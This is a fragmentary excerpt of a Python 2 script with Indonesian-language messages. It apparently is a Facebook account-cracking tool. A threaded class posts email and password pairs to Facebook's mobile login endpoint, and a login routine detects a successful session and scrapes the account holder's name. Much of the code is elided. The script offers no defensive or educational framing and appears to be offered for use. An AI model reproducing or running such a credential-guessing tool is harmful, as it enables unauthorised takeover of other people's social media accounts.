...
if platform.python_version().split('.')[0] != '2':
    cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x' % platform.python_version())
    sys.exit()

import cookielib, re, threading
...
class mt(threading.Thread):
    ...
    def run(self):
        try:
            data = session.post('https://m.facebook.com/login.php', data={'email': self.id, 'pass': self.p}, headers={'User-Agent': 'Mozilla/5.0'})
...
def login():
    ...
    if 'save-device' in response.url or 'm_sess' in response.url:
        home_page = session.get('https://mobile.facebook.com/home.php')
        soup = BeautifulSoup(home_page.text, 'html.parser')
        nama = soup.find('a', href=re.compile('logout.php')).text
